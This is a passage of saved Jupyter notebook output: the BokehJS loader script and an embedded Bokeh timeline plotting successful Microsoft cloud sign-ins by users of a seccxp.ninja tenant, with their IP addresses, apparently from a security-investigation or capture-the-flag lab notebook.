element.append(toinsert);\n      return toinsert\n    }\n\n    /* Handle when an output is cleared or removed */\n    events.on('clear_output.CodeCell', handleClearOutput);\n    events.on('delete.Cell', handleClearOutput);\n\n    /* Handle when a new output is added */\n    events.on('output_added.OutputArea', handleAddOutput);\n\n    /**\n     * Register the mime type and append_mime function with output_area\n     */\n    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n      /* Is output safe? */\n      safe: true,\n      /* Index of renderer in `output_area.display_order` */\n      index: 0\n    });\n  }\n\n  // register the mime type if in Jupyter Notebook environment and previously unregistered\n  if (root.Jupyter !== undefined) {\n    const events = require('base/js/events');\n    const OutputArea = require('notebook/js/outputarea').OutputArea;\n\n    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n      register_renderer(events, OutputArea);\n    }\n  }\n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  const NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded(error = null) {\n    const el = document.getElementById(\"ea3a5c1c-e1ba-47fe-b60a-9a91fe9d6c03\");\n    if (el != null) {\n      const html = (() => {\n        if (typeof root.Bokeh === \"undefined\") {\n          if (error == null) {\n            return \"BokehJS is loading ...\";\n          } else {\n            return \"BokehJS failed to load.\";\n          }\n        } else {\n          const prefix = `BokehJS ${root.Bokeh.version}`;\n          if (error == null) {\n            return `${prefix} successfully loaded.`;\n          } else {\n            return `${prefix} <b>encountered errors</b> while loading and may not function as expected.`;\n          }\n        }\n      })();\n      el.innerHTML = html;\n\n      if (error != null) {\n        const wrapper = document.createElement(\"div\");\n        wrapper.style.overflow = \"auto\";\n        wrapper.style.height = \"5em\";\n        wrapper.style.resize = \"vertical\";\n        const content = document.createElement(\"div\");\n        content.style.fontFamily = \"monospace\";\n        content.style.whiteSpace = \"pre-wrap\";\n        content.style.backgroundColor = \"rgb(255, 221, 221)\";\n        content.textContent = error.stack ?? error.toString();\n        wrapper.append(content);\n        el.append(wrapper);\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(() => display_loaded(error), 100);\n    }\n  }\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error(url) {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (let i = 0; i < css_urls.length; i++) {\n      const url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    for (let i = 0; i < js_urls.length; i++) {\n      const url = js_urls[i];\n      const element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.async = false;\n      element.src = url;\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  const js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-mathjax-3.7.3.min.js\"];\n  const css_urls = [];\n\n  const inline_js = [    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\nfunction(Bokeh) {\n    }\n  ];\n\n  function run_inline_js() {\n    if (root.Bokeh !== undefined || force === true) {\n      try {\n            for (let i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n\n      } catch (error) {display_loaded(error);throw error;\n      }if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      const cell = $(document.getElementById(\"ea3a5c1c-e1ba-47fe-b60a-9a91fe9d6c03\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));",
      "application/vnd.bokehjs_load.v0+json": ""
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "  <div id=\"d173dd14-f302-42c0-b138-47327612cfc5\" data-root-id=\"p2999\" style=\"display: contents;\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "(function(root) {\n  function embed_document(root) {\n  const docs_json = {\"3ad8e9cd-62fe-4fd2-afa6-d479543012d9\":{\"version\":\"3.7.3\",\"title\":\"Bokeh Application\",\"roots\":[{\"type\":\"object\",\"name\":\"Column\",\"id\":\"p2999\",\"attributes\":{\"children\":[{\"type\":\"object\",\"name\":\"Figure\",\"id\":\"p2658\",\"attributes\":{\"width\":900,\"height\":440,\"x_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p2668\",\"attributes\":{\"start\":1755239052715.6328,\"end\":1755294178766.833}},\"y_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p2669\",\"attributes\":{\"start\":-0.09090909090909091,\"end\":10.090909090909092}},\"x_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2670\"},\"y_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2671\"},\"title\":{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p2661\",\"attributes\":{\"text\":\"Timeline: Events\"}},\"renderers\":[{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2894\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2590\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2591\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2592\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AgAAAAMAAAAJAAAAFgAAACUAAAAnAAAALgAAADoAAABuAAAApAAAABUCAAAWAgAA\"},\"shape\":[12],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\"],\"shape\":[12],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"ctfuser3@seccxp.ninja\",\"zvon@seccxp.ninja\",\"zvon@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"zvon@seccxp.ninja\",\"zvon@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\"],\"shape\":[12],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\"],\"shape\":[12],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"24.13.212.221\",\"24.16.133.227\",\"24.16.133.227\",\"24.13.212.221\",\"73.226.223.252\",\"73.226.223.252\",\"24.16.133.227\",\"24.16.133.227\",\"73.226.223.252\",\"73.226.223.252\",\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[12],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"upPzS/GKeUK60z4U8op5QrrTPhTyinlCupPzS/GKeUK6M6EX7Yp5QrozoRftinlCuuPupOWKeUK64+6k5Yp5QrqTSBftinlCupNIF+2KeUK6gyGS9op5QrqDIZL2inlC\"},\"shape\":[12],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"},\"shape\":[12],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2895\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2896\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2891\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2892\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2893\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2904\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2593\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2594\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2595\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"aQAAALcAAAA3AgAATwIAAKsCAAA=\"},\"shape\":[5],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Microsoft 365 Security and Compliance Center\",\"Microsoft 365 Security and Compliance Center\",\"Microsoft 365 Security and Compliance Center\",\"Microsoft 365 Security and Compliance Center\",\"Microsoft 365 Security and Compliance Center\"],\"shape\":[5],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\"],\"shape\":[5],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\"],\"shape\":[5],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"73.35.204.105\",\"73.35.204.105\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[5],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"unNtIueKeUK6c20i54p5QrqT5cjKinlCupPlyMqKeUK6swhg0Ip5Qg==\"},\"shape\":[5],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AQAAAAEAAAABAAAAAQAAAAEAAAA=\"},\"shape\":[5],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2905\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2906\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2901\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2902\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2903\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2914\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2596\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2597\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2598\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"4AAAAOIAAABuAgAAcAIAAHMCAAB9AgAAjAIAAA==\"},\"shape\":[7],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\"],\"shape\":[7],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\"],\"shape\":[7],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\"],\"shape\":[7],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"73.35.204.105\",\"73.35.204.105\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[7],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"ulM9aueKeUK6Uz1q54p5QroT+1j1inlCuhP7WPWKeUK6E1KY9op5Qrqztl3LinlCurO2XcuKeUI=\"},\"shape\":[7],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AgAAAAIAAAACAAAAAgAAAAIAAAACAAAAAgAAAA==\"},\"shape\":[7],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2915\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2916\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2911\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2912\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2913\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2924\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2599\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2600\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2601\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"eAAAAN4BAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Microsoft Forms\",\"Microsoft Forms\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"caroline@seccxp.ninja\",\"caroline@seccxp.ninja\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"136.55.145.135\",\"136.55.145.135\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"utPR8eKKeUK609Hx4op5Qg==\"},\"shape\":[2],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AwAAAAMAAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2925\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2926\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2921\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2922\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2923\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2934\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2602\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2603\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2604\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"OQEAAGICAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Microsoft Stream Portal\",\"Microsoft Stream Portal\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"seb@seccxp.ninja\",\"seb@seccxp.ninja\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"urOMduGKeUK6s4x24Yp5Qg==\"},\"shape\":[2],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"BAAAAAQAAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2935\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2936\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2931\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2932\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"line_alpha\":{\"type\":\"value\",\